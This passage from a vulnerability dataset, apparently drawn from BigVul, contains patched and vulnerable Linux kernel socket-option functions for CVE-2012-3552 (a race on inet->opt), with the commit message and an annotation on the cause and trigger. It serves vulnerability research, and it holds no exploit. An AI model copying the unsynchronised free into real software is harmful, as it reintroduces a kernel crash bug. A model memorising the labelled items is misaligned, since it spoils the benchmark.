        "solutions": "static int do_ip_getsockopt(struct sock *sk, int level, int optname,\n\t\t\t    char __user *optval, int __user *optlen)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tint val;\n\tint len;\n\n\tif (level != SOL_IP)\n\t\treturn -EOPNOTSUPP;\n\n\tif (ip_mroute_opt(optname))\n\t\treturn ip_mroute_getsockopt(sk, optname, optval, optlen);\n\n\tif (get_user(len, optlen))\n\t\treturn -EFAULT;\n\tif (len < 0)\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\n\tswitch (optname) {\n \tcase IP_OPTIONS:\n \t{\n \t\tunsigned char optbuf[sizeof(struct ip_options)+40];\n\t\tstruct ip_options *opt = (struct ip_options *)optbuf;\n\t\tstruct ip_options_rcu *inet_opt;\n\n\t\tinet_opt = rcu_dereference_protected(inet->inet_opt,\n\t\t\t\t\t\t     sock_owned_by_user(sk));\n \t\topt->optlen = 0;\n\t\tif (inet_opt)\n\t\t\tmemcpy(optbuf, &inet_opt->opt,\n\t\t\t       sizeof(struct ip_options) +\n\t\t\t       inet_opt->opt.optlen);\n \t\trelease_sock(sk);\n \n \t\tif (opt->optlen == 0)\n\t\t\treturn put_user(0, optlen);\n\n\t\tip_options_undo(opt);\n\n\t\tlen = min_t(unsigned int, len, opt->optlen);\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, opt->__data, len))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\tcase IP_PKTINFO:\n\t\tval = (inet->cmsg_flags & IP_CMSG_PKTINFO) != 0;\n\t\tbreak;\n\tcase IP_RECVTTL:\n\t\tval = (inet->cmsg_flags & IP_CMSG_TTL) != 0;\n\t\tbreak;\n\tcase IP_RECVTOS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_TOS) != 0;\n\t\tbreak;\n\tcase IP_RECVOPTS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_RECVOPTS) != 0;\n\t\tbreak;\n\tcase IP_RETOPTS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_RETOPTS) != 0;\n\t\tbreak;\n\tcase IP_PASSSEC:\n\t\tval = (inet->cmsg_flags & IP_CMSG_PASSSEC) != 0;\n\t\tbreak;\n\tcase IP_RECVORIGDSTADDR:\n\t\tval = (inet->cmsg_flags & IP_CMSG_ORIGDSTADDR) != 0;\n\t\tbreak;\n\tcase IP_TOS:\n\t\tval = inet->tos;\n\t\tbreak;\n\tcase IP_TTL:\n\t\tval = (inet->uc_ttl == -1 ?\n\t\t       sysctl_ip_default_ttl :\n\t\t       inet->uc_ttl);\n\t\tbreak;\n\tcase IP_HDRINCL:\n\t\tval = inet->hdrincl;\n\t\tbreak;\n\tcase IP_NODEFRAG:\n\t\tval = inet->nodefrag;\n\t\tbreak;\n\tcase IP_MTU_DISCOVER:\n\t\tval = inet->pmtudisc;\n\t\tbreak;\n\tcase IP_MTU:\n\t{\n\t\tstruct dst_entry *dst;\n\t\tval = 0;\n\t\tdst = sk_dst_get(sk);\n\t\tif (dst) {\n\t\t\tval = dst_mtu(dst);\n\t\t\tdst_release(dst);\n\t\t}\n\t\tif (!val) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -ENOTCONN;\n\t\t}\n\t\tbreak;\n\t}\n\tcase IP_RECVERR:\n\t\tval = inet->recverr;\n\t\tbreak;\n\tcase IP_MULTICAST_TTL:\n\t\tval = inet->mc_ttl;\n\t\tbreak;\n\tcase IP_MULTICAST_LOOP:\n\t\tval = inet->mc_loop;\n\t\tbreak;\n\tcase IP_MULTICAST_IF:\n\t{\n\t\tstruct in_addr addr;\n\t\tlen = min_t(unsigned int, len, sizeof(struct in_addr));\n\t\taddr.s_addr = inet->mc_addr;\n\t\trelease_sock(sk);\n\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &addr, len))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\tcase IP_MSFILTER:\n\t{\n\t\tstruct ip_msfilter msf;\n\t\tint err;\n\n\t\tif (len < IP_MSFILTER_SIZE(0)) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tif (copy_from_user(&msf, optval, IP_MSFILTER_SIZE(0))) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\terr = ip_mc_msfget(sk, &msf,\n\t\t\t\t   (struct ip_msfilter __user *)optval, optlen);\n\t\trelease_sock(sk);\n\t\treturn err;\n\t}\n\tcase MCAST_MSFILTER:\n\t{\n\t\tstruct group_filter gsf;\n\t\tint err;\n\n\t\tif (len < GROUP_FILTER_SIZE(0)) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tif (copy_from_user(&gsf, optval, GROUP_FILTER_SIZE(0))) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\terr = ip_mc_gsfget(sk, &gsf,\n\t\t\t\t   (struct group_filter __user *)optval,\n\t\t\t\t   optlen);\n\t\trelease_sock(sk);\n\t\treturn err;\n\t}\n\tcase IP_MULTICAST_ALL:\n\t\tval = inet->mc_all;\n\t\tbreak;\n\tcase IP_PKTOPTIONS:\n\t{\n\t\tstruct msghdr msg;\n\n\t\trelease_sock(sk);\n\n\t\tif (sk->sk_type != SOCK_STREAM)\n\t\t\treturn -ENOPROTOOPT;\n\n\t\tmsg.msg_control = optval;\n\t\tmsg.msg_controllen = len;\n\t\tmsg.msg_flags = 0;\n\n\t\tif (inet->cmsg_flags & IP_CMSG_PKTINFO) {\n\t\t\tstruct in_pktinfo info;\n\n\t\t\tinfo.ipi_addr.s_addr = inet->inet_rcv_saddr;\n\t\t\tinfo.ipi_spec_dst.s_addr = inet->inet_rcv_saddr;\n\t\t\tinfo.ipi_ifindex = inet->mc_index;\n\t\t\tput_cmsg(&msg, SOL_IP, IP_PKTINFO, sizeof(info), &info);\n\t\t}\n\t\tif (inet->cmsg_flags & IP_CMSG_TTL) {\n\t\t\tint hlim = inet->mc_ttl;\n\t\t\tput_cmsg(&msg, SOL_IP, IP_TTL, sizeof(hlim), &hlim);\n\t\t}\n\t\tlen -= msg.msg_controllen;\n\t\treturn put_user(len, optlen);\n\t}\n\tcase IP_FREEBIND:\n\t\tval = inet->freebind;\n\t\tbreak;\n\tcase IP_TRANSPARENT:\n\t\tval = inet->transparent;\n\t\tbreak;\n\tcase IP_MINTTL:\n\t\tval = inet->min_ttl;\n\t\tbreak;\n\tdefault:\n\t\trelease_sock(sk);\n\t\treturn -ENOPROTOOPT;\n\t}\n\trelease_sock(sk);\n\n\tif (len < sizeof(int) && len > 0 && val >= 0 && val <= 255) {\n\t\tunsigned char ucval = (unsigned char)val;\n\t\tlen = 1;\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &ucval, 1))\n\t\t\treturn -EFAULT;\n\t} else {\n\t\tlen = min_t(unsigned int, sizeof(int), len);\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &val, len))\n\t\t\treturn -EFAULT;\n\t}\n\treturn 0;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_sockglue.c": "static int do_ip_setsockopt(struct sock *sk, int level,\n\t\t\t    int optname, char __user *optval, unsigned int optlen)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tint val = 0, err;\n\n\tif (((1<<optname) & ((1<<IP_PKTINFO) | (1<<IP_RECVTTL) |\n\t\t\t     (1<<IP_RECVOPTS) | (1<<IP_RECVTOS) |\n\t\t\t     (1<<IP_RETOPTS) | (1<<IP_TOS) |\n\t\t\t     (1<<IP_TTL) | (1<<IP_HDRINCL) |\n\t\t\t     (1<<IP_MTU_DISCOVER) | (1<<IP_RECVERR) |\n\t\t\t     (1<<IP_ROUTER_ALERT) | (1<<IP_FREEBIND) |\n\t\t\t     (1<<IP_PASSSEC) | (1<<IP_TRANSPARENT) |\n\t\t\t     (1<<IP_MINTTL) | (1<<IP_NODEFRAG))) ||\n\t    optname == IP_MULTICAST_TTL ||\n\t    optname == IP_MULTICAST_ALL ||\n\t    optname == IP_MULTICAST_LOOP ||\n\t    optname == IP_RECVORIGDSTADDR) {\n\t\tif (optlen >= sizeof(int)) {\n\t\t\tif (get_user(val, (int __user *) optval))\n\t\t\t\treturn -EFAULT;\n\t\t} else if (optlen >= sizeof(char)) {\n\t\t\tunsigned char ucval;\n\n\t\t\tif (get_user(ucval, (unsigned char __user *) optval))\n\t\t\t\treturn -EFAULT;\n\t\t\tval = (int) ucval;\n\t\t}\n\t}\n\n\t/* If optlen==0, it is equivalent to val == 0 */\n\n\tif (ip_mroute_opt(optname))\n\t\treturn ip_mroute_setsockopt(sk, optname, optval, optlen);\n\n\terr = 0;\n\tlock_sock(sk);\n\n \tswitch (optname) {\n \tcase IP_OPTIONS:\n \t{\n\t\tstruct ip_options *opt = NULL;\n \t\tif (optlen > 40)\n \t\t\tgoto e_inval;\n \t\terr = ip_options_get_from_user(sock_net(sk), &opt,\n \t\t\t\t\t       optval, optlen);\n \t\tif (err)\n \t\t\tbreak;\n \t\tif (inet->is_icsk) {\n \t\t\tstruct inet_connection_sock *icsk = inet_csk(sk);\n #if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)\n\t\t\tif (sk->sk_family == PF_INET ||\n\t\t\t    (!((1 << sk->sk_state) &\n \t\t\t       (TCPF_LISTEN | TCPF_CLOSE)) &&\n \t\t\t     inet->inet_daddr != LOOPBACK4_IPV6)) {\n #endif\n\t\t\t\tif (inet->opt)\n\t\t\t\t\ticsk->icsk_ext_hdr_len -= inet->opt->optlen;\n \t\t\t\tif (opt)\n\t\t\t\t\ticsk->icsk_ext_hdr_len += opt->optlen;\n \t\t\t\ticsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);\n #if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)\n \t\t\t}\n #endif\n \t\t}\n\t\topt = xchg(&inet->opt, opt);\n\t\tkfree(opt);\n \t\tbreak;\n \t}\n \tcase IP_PKTINFO:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_PKTINFO;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_PKTINFO;\n\t\tbreak;\n\tcase IP_RECVTTL:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_TTL;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_TTL;\n\t\tbreak;\n\tcase IP_RECVTOS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_TOS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_TOS;\n\t\tbreak;\n\tcase IP_RECVOPTS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_RECVOPTS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_RECVOPTS;\n\t\tbreak;\n\tcase IP_RETOPTS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_RETOPTS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_RETOPTS;\n\t\tbreak;\n\tcase IP_PASSSEC:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_PASSSEC;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_PASSSEC;\n\t\tbreak;\n\tcase IP_RECVORIGDSTADDR:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_ORIGDSTADDR;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_ORIGDSTADDR;\n\t\tbreak;\n\tcase IP_TOS:\t/* This sets both TOS and Precedence */\n\t\tif (sk->sk_type == SOCK_STREAM) {\n\t\t\tval &= ~3;\n\t\t\tval |= inet->tos & 3;\n\t\t}\n\t\tif (inet->tos != val) {\n\t\t\tinet->tos = val;\n\t\t\tsk->sk_priority = rt_tos2priority(val);\n\t\t\tsk_dst_reset(sk);\n\t\t}\n\t\tbreak;\n\tcase IP_TTL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val != -1 && (val < 0 || val > 255))\n\t\t\tgoto e_inval;\n\t\tinet->uc_ttl = val;\n\t\tbreak;\n\tcase IP_HDRINCL:\n\t\tif (sk->sk_type != SOCK_RAW) {\n\t\t\terr = -ENOPROTOOPT;\n\t\t\tbreak;\n\t\t}\n\t\tinet->hdrincl = val ? 1 : 0;\n\t\tbreak;\n\tcase IP_NODEFRAG:\n\t\tif (sk->sk_type != SOCK_RAW) {\n\t\t\terr = -ENOPROTOOPT;\n\t\t\tbreak;\n\t\t}\n\t\tinet->nodefrag = val ? 1 : 0;\n\t\tbreak;\n\tcase IP_MTU_DISCOVER:\n\t\tif (val < IP_PMTUDISC_DONT || val > IP_PMTUDISC_PROBE)\n\t\t\tgoto e_inval;\n\t\tinet->pmtudisc = val;\n\t\tbreak;\n\tcase IP_RECVERR:\n\t\tinet->recverr = !!val;\n\t\tif (!val)\n\t\t\tskb_queue_purge(&sk->sk_error_queue);\n\t\tbreak;\n\tcase IP_MULTICAST_TTL:\n\t\tif (sk->sk_type == SOCK_STREAM)\n\t\t\tgoto e_inval;\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val == -1)\n\t\t\tval = 1;\n\t\tif (val < 0 || val > 255)\n\t\t\tgoto e_inval;\n\t\tinet->mc_ttl = val;\n\t\tbreak;\n\tcase IP_MULTICAST_LOOP:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->mc_loop = !!val;\n\t\tbreak;\n\tcase IP_MULTICAST_IF:\n\t{\n\t\tstruct ip_mreqn mreq;\n\t\tstruct net_device *dev = NULL;\n\n\t\tif (sk->sk_type == SOCK_STREAM)\n\t\t\tgoto e_inval;\n\t\t/*\n\t\t *\tCheck the arguments are allowable\n\t\t */\n\n\t\tif (optlen < sizeof(struct in_addr))\n\t\t\tgoto e_inval;\n\n\t\terr = -EFAULT;\n\t\tif (optlen >= sizeof(struct ip_mreqn)) {\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(mreq)))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\t\tif (optlen >= sizeof(struct in_addr) &&\n\t\t\t    copy_from_user(&mreq.imr_address, optval,\n\t\t\t\t\t   sizeof(struct in_addr)))\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (!mreq.imr_ifindex) {\n\t\t\tif (mreq.imr_address.s_addr == htonl(INADDR_ANY)) {\n\t\t\t\tinet->mc_index = 0;\n\t\t\t\tinet->mc_addr  = 0;\n\t\t\t\terr = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdev = ip_dev_find(sock_net(sk), mreq.imr_address.s_addr);\n\t\t\tif (dev)\n\t\t\t\tmreq.imr_ifindex = dev->ifindex;\n\t\t} else\n\t\t\tdev = dev_get_by_index(sock_net(sk), mreq.imr_ifindex);\n\n\n\t\terr = -EADDRNOTAVAIL;\n\t\tif (!dev)\n\t\t\tbreak;\n\t\tdev_put(dev);\n\n\t\terr = -EINVAL;\n\t\tif (sk->sk_bound_dev_if &&\n\t\t    mreq.imr_ifindex != sk->sk_bound_dev_if)\n\t\t\tbreak;\n\n\t\tinet->mc_index = mreq.imr_ifindex;\n\t\tinet->mc_addr  = mreq.imr_address.s_addr;\n\t\terr = 0;\n\t\tbreak;\n\t}\n\n\tcase IP_ADD_MEMBERSHIP:\n\tcase IP_DROP_MEMBERSHIP:\n\t{\n\t\tstruct ip_mreqn mreq;\n\n\t\terr = -EPROTO;\n\t\tif (inet_sk(sk)->is_icsk)\n\t\t\tbreak;\n\n\t\tif (optlen < sizeof(struct ip_mreq))\n\t\t\tgoto e_inval;\n\t\terr = -EFAULT;\n\t\tif (optlen >= sizeof(struct ip_mreqn)) {\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(mreq)))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(struct ip_mreq)))\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (optname == IP_ADD_MEMBERSHIP)\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\telse\n\t\t\terr = ip_mc_leave_group(sk, &mreq);\n\t\tbreak;\n\t}\n\tcase IP_MSFILTER:\n\t{\n\t\tstruct ip_msfilter *msf;\n\n\t\tif (optlen < IP_MSFILTER_SIZE(0))\n\t\t\tgoto e_inval;\n\t\tif (optlen > sysctl_optmem_max) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tmsf = kmalloc(optlen, GFP_KERNEL);\n\t\tif (!msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(msf, optval, optlen)) {\n\t\t\tkfree(msf);\n\t\t\tbreak;\n\t\t}\n\t\t/* numsrc >= (1G-4) overflow in 32 bits */\n\t\tif (msf->imsf_numsrc >= 0x3ffffffcU ||\n\t\t    msf->imsf_numsrc > sysctl_igmp_max_msf) {\n\t\t\tkfree(msf);\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tif (IP_MSFILTER_SIZE(msf->imsf_numsrc) > optlen) {\n\t\t\tkfree(msf);\n\t\t\terr = -EINVAL;\n\t\t\tbreak;\n\t\t}\n\t\terr = ip_mc_msfilter(sk, msf, 0);\n\t\tkfree(msf);\n\t\tbreak;\n\t}\n\tcase IP_BLOCK_SOURCE:\n\tcase IP_UNBLOCK_SOURCE:\n\tcase IP_ADD_SOURCE_MEMBERSHIP:\n\tcase IP_DROP_SOURCE_MEMBERSHIP:\n\t{\n\t\tstruct ip_mreq_source mreqs;\n\t\tint omode, add;\n\n\t\tif (optlen != sizeof(struct ip_mreq_source))\n\t\t\tgoto e_inval;\n\t\tif (copy_from_user(&mreqs, optval, sizeof(mreqs))) {\n\t\t\terr = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tif (optname == IP_BLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 1;\n\t\t} else if (optname == IP_UNBLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 0;\n\t\t} else if (optname == IP_ADD_SOURCE_MEMBERSHIP) {\n\t\t\tstruct ip_mreqn mreq;\n\n\t\t\tmreq.imr_multiaddr.s_addr = mreqs.imr_multiaddr;\n\t\t\tmreq.imr_address.s_addr = mreqs.imr_interface;\n\t\t\tmreq.imr_ifindex = 0;\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\t\tif (err && err != -EADDRINUSE)\n\t\t\t\tbreak;\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 1;\n\t\t} else /* IP_DROP_SOURCE_MEMBERSHIP */ {\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 0;\n\t\t}\n\t\terr = ip_mc_source(add, omode, sk, &mreqs, 0);\n\t\tbreak;\n\t}\n\tcase MCAST_JOIN_GROUP:\n\tcase MCAST_LEAVE_GROUP:\n\t{\n\t\tstruct group_req greq;\n\t\tstruct sockaddr_in *psin;\n\t\tstruct ip_mreqn mreq;\n\n\t\tif (optlen < sizeof(struct group_req))\n\t\t\tgoto e_inval;\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(&greq, optval, sizeof(greq)))\n\t\t\tbreak;\n\t\tpsin = (struct sockaddr_in *)&greq.gr_group;\n\t\tif (psin->sin_family != AF_INET)\n\t\t\tgoto e_inval;\n\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\tmreq.imr_multiaddr = psin->sin_addr;\n\t\tmreq.imr_ifindex = greq.gr_interface;\n\n\t\tif (optname == MCAST_JOIN_GROUP)\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\telse\n\t\t\terr = ip_mc_leave_group(sk, &mreq);\n\t\tbreak;\n\t}\n\tcase MCAST_JOIN_SOURCE_GROUP:\n\tcase MCAST_LEAVE_SOURCE_GROUP:\n\tcase MCAST_BLOCK_SOURCE:\n\tcase MCAST_UNBLOCK_SOURCE:\n\t{\n\t\tstruct group_source_req greqs;\n\t\tstruct ip_mreq_source mreqs;\n\t\tstruct sockaddr_in *psin;\n\t\tint omode, add;\n\n\t\tif (optlen != sizeof(struct group_source_req))\n\t\t\tgoto e_inval;\n\t\tif (copy_from_user(&greqs, optval, sizeof(greqs))) {\n\t\t\terr = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tif (greqs.gsr_group.ss_family != AF_INET ||\n\t\t    greqs.gsr_source.ss_family != AF_INET) {\n\t\t\terr = -EADDRNOTAVAIL;\n\t\t\tbreak;\n\t\t}\n\t\tpsin = (struct sockaddr_in *)&greqs.gsr_group;\n\t\tmreqs.imr_multiaddr = psin->sin_addr.s_addr;\n\t\tpsin = (struct sockaddr_in *)&greqs.gsr_source;\n\t\tmreqs.imr_sourceaddr = psin->sin_addr.s_addr;\n\t\tmreqs.imr_interface = 0; /* use index for mc_source */\n\n\t\tif (optname == MCAST_BLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 1;\n\t\t} else if (optname == MCAST_UNBLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 0;\n\t\t} else if (optname == MCAST_JOIN_SOURCE_GROUP) {\n\t\t\tstruct ip_mreqn mreq;\n\n\t\t\tpsin = (struct sockaddr_in *)&greqs.gsr_group;\n\t\t\tmreq.imr_multiaddr = psin->sin_addr;\n\t\t\tmreq.imr_address.s_addr = 0;\n\t\t\tmreq.imr_ifindex = greqs.gsr_interface;\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\t\tif (err && err != -EADDRINUSE)\n\t\t\t\tbreak;\n\t\t\tgreqs.gsr_interface = mreq.imr_ifindex;\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 1;\n\t\t} else /* MCAST_LEAVE_SOURCE_GROUP */ {\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 0;\n\t\t}\n\t\terr = ip_mc_source(add, omode, sk, &mreqs,\n\t\t\t\t   greqs.gsr_interface);\n\t\tbreak;\n\t}\n\tcase MCAST_MSFILTER:\n\t{\n\t\tstruct sockaddr_in *psin;\n\t\tstruct ip_msfilter *msf = NULL;\n\t\tstruct group_filter *gsf = NULL;\n\t\tint msize, i, ifindex;\n\n\t\tif (optlen < GROUP_FILTER_SIZE(0))\n\t\t\tgoto e_inval;\n\t\tif (optlen > sysctl_optmem_max) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tgsf = kmalloc(optlen, GFP_KERNEL);\n\t\tif (!gsf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(gsf, optval, optlen))\n\t\t\tgoto mc_msf_out;\n\n\t\t/* numsrc >= (4G-140)/128 overflow in 32 bits */\n\t\tif (gsf->gf_numsrc >= 0x1ffffff ||\n\t\t    gsf->gf_numsrc > sysctl_igmp_max_msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tif (GROUP_FILTER_SIZE(gsf->gf_numsrc) > optlen) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tmsize = IP_MSFILTER_SIZE(gsf->gf_numsrc);\n\t\tmsf = kmalloc(msize, GFP_KERNEL);\n\t\tif (!msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tifindex = gsf->gf_interface;\n\t\tpsin = (struct sockaddr_in *)&gsf->gf_group;\n\t\tif (psin->sin_family != AF_INET) {\n\t\t\terr = -EADDRNOTAVAIL;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tmsf->imsf_multiaddr = psin->sin_addr.s_addr;\n\t\tmsf->imsf_interface = 0;\n\t\tmsf->imsf_fmode = gsf->gf_fmode;\n\t\tmsf->imsf_numsrc = gsf->gf_numsrc;\n\t\terr = -EADDRNOTAVAIL;\n\t\tfor (i = 0; i < gsf->gf_numsrc; ++i) {\n\t\t\tpsin = (struct sockaddr_in *)&gsf->gf_slist[i];\n\n\t\t\tif (psin->sin_family != AF_INET)\n\t\t\t\tgoto mc_msf_out;\n\t\t\tmsf->imsf_slist[i] = psin->sin_addr.s_addr;\n\t\t}\n\t\tkfree(gsf);\n\t\tgsf = NULL;\n\n\t\terr = ip_mc_msfilter(sk, msf, ifindex);\nmc_msf_out:\n\t\tkfree(msf);\n\t\tkfree(gsf);\n\t\tbreak;\n\t}\n\tcase IP_MULTICAST_ALL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val != 0 && val != 1)\n\t\t\tgoto e_inval;\n\t\tinet->mc_all = val;\n\t\tbreak;\n\tcase IP_ROUTER_ALERT:\n\t\terr = ip_ra_control(sk, val ? 1 : 0, NULL);\n\t\tbreak;\n\n\tcase IP_FREEBIND:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->freebind = !!val;\n\t\tbreak;\n\n\tcase IP_IPSEC_POLICY:\n\tcase IP_XFRM_POLICY:\n\t\terr = -EPERM;\n\t\tif (!capable(CAP_NET_ADMIN))\n\t\t\tbreak;\n\t\terr = xfrm_user_policy(sk, optname, optval, optlen);\n\t\tbreak;\n\n\tcase IP_TRANSPARENT:\n\t\tif (!capable(CAP_NET_ADMIN)) {\n\t\t\terr = -EPERM;\n\t\t\tbreak;\n\t\t}\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->transparent = !!val;\n\t\tbreak;\n\n\tcase IP_MINTTL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val < 0 || val > 255)\n\t\t\tgoto e_inval;\n\t\tinet->min_ttl = val;\n\t\tbreak;\n\n\tdefault:\n\t\terr = -ENOPROTOOPT;\n\t\tbreak;\n\t}\n\trelease_sock(sk);\n\treturn err;\n\ne_inval:\n\trelease_sock(sk);\n\treturn -EINVAL;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in Linux IPv4 socket options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2012-10-03\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource Without Synchronization; Race condition in ip_sockglue.c causing heap corruption and denial of service\n\n[Mandatory] Summary:\nA race condition exists in do_ip_setsockopt() in net/ipv4/ip_sockglue.c where the socket option inet->opt is modified without proper RCU protection. When a thread modifies socket options (via setsockopt) while another thread processes network traffic and copies the same inet->opt pointer, a use-after-free or double-free can occur. An attacker can trigger concurrent access to inet->opt, causing the allocator to corrupt heap metadata, leading to system crash and denial of service. The vulnerability is specifically in the IP_OPTIONS case where inet->opt is freed and reallocated without synchronization between the socket lock and RCU read-side operations used by packet processing.\n\n[Mandatory] Root cause:\ninet->opt is accessed and modified without RCU synchronization, allowing packet processing threads to read freed or reallocated memory concurrently with setsockopt modifications.\n\n[Mandatory] Attack Surface:\nLocal network stack, socket layer, IPv4 processing\n\n[Mandatory] Impact Summary:\nDenial of service via heap corruption and kernel crash\n\n[Optional] Trigger / Attack vector:\nConcurrent setsockopt(IP_OPTIONS) calls combined with active packet processing on the same socket\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\ncase IP_OPTIONS:\n{\n    struct ip_options *opt = NULL;\n    // ... get new opt from user ...\n    if (inet->opt)\n        icsk->icsk_ext_hdr_len -= inet->opt->optlen;\n    if (opt)\n        icsk->icsk_ext_hdr_len += opt->optlen;\n    opt = xchg(&inet->opt, opt);\n    kfree(opt);  // Race: packet processing may still reference old opt\n    